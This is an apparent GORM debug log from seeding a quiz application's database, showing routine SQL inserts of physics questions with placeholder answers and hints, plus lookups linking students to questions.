[0m[33m[7.417ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:55.991','2025-06-09 14:07:55.991',NULL,'Who is known as the father of modern physics?','1234','hello world','hello world 2','hello world 3',50,3,1) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.651ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.528ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[10.950ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:56.002','2025-06-09 14:07:56.002',NULL,'What is the formula for calculating force?','1234','hello world','hello world 2','hello world 3',150,4,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.635ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.487ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[9.432ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:56.01','2025-06-09 14:07:56.01',NULL,'What is the first law of thermodynamics?','1234','hello world','hello world 2','hello world 3',30,5,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.642ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.454ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 1 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[7.223ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:56.019','2025-06-09 14:07:56.019',NULL,'What is the unit of frequency?','1234','hello world','hello world 2','hello world 3',99,1,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "courses" WHERE "courses"."id" = 1 AND "courses"."deleted_at" IS NULL ORDER BY "courses"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.468ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionModel.go:43
[0m[33m[8.692ms] [34;1m[rows:1][0m INSERT INTO "questions" ("created_at","updated_at","deleted_at","question","answer","hint1","hint2","hint3","point","difficulty_level_id","course_id") VALUES ('2025-06-09 14:07:56.027','2025-06-09 14:07:56.027',NULL,'What is the principle of superposition?','1234','hello world','hello world 2','hello world 3',110,2,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.693ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 1 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[10.899ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.038','2025-06-09 14:07:56.038',NULL,1,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.469ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.734ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 2 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[12.655ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.047','2025-06-09 14:07:56.047',NULL,1,2) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.414ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.593ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 3 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[10.815ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.059','2025-06-09 14:07:56.059',NULL,1,3) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.285ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.693ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 4 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[8.333ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.071','2025-06-09 14:07:56.071',NULL,1,4) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.443ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.611ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 5 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[8.485ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.079','2025-06-09 14:07:56.079',NULL,1,5) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.807ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 1 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[12.221ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.09','2025-06-09 14:07:56.09',NULL,2,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.415ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 2 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[6.939ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.099','2025-06-09 14:07:56.099',NULL,2,2) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.497ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.544ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 3 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[7.123ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.107','2025-06-09 14:07:56.107',NULL,2,3) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.419ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.451ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 4 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[6.914ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.114','2025-06-09 14:07:56.114',NULL,2,4) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.522ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.520ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 5 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[7.254ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.121','2025-06-09 14:07:56.121',NULL,2,5) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.451ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 2 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.639ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 6 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[8.635ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.128','2025-06-09 14:07:56.128',NULL,2,6) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.598ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 3 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.584ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 1 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[10.603ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.14','2025-06-09 14:07:56.14',NULL,3,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.417ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 3 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.386ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 2 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[8.682ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.147','2025-06-09 14:07:56.147',NULL,3,2) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 3 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 3 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[9.186ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.156','2025-06-09 14:07:56.156',NULL,3,3) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.474ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 6 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[7.457ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.165','2025-06-09 14:07:56.165',NULL,1,6) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.458ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.447ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 7 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[8.232ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.173','2025-06-09 14:07:56.173',NULL,1,7) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.418ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.460ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 8 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[6.814ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.181','2025-06-09 14:07:56.181',NULL,1,8) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.467ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.520ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 9 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[6.985ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.188','2025-06-09 14:07:56.188',NULL,1,9) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.424ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.150ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 10 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[9.925ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.197','2025-06-09 14:07:56.197',NULL,1,10) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.704ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.533ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 11 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[7.383ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.206','2025-06-09 14:07:56.206',NULL,1,11) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.421ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.395ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 12 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[6.571ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.213','2025-06-09 14:07:56.213',NULL,1,12) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.519ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.578ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 13 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[9.058ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.22','2025-06-09 14:07:56.22',NULL,1,13) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 14 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[10.114ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.229','2025-06-09 14:07:56.229',NULL,1,14) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.470ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.509ms] [34;1m[rows:1][0m SELECT * FROM "questions" WHERE "questions"."id" = 15 AND "questions"."deleted_at" IS NULL ORDER BY "questions"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/QuestionStudentMdoel.go:29
[0m[33m[7.991ms] [34;1m[rows:1][0m INSERT INTO "question_students" ("created_at","updated_at","deleted_at","student_id","question_id") VALUES ('2025-06-09 14:07:56.239','2025-06-09 14:07:56.239',NULL,1,15) RETURNING "id"

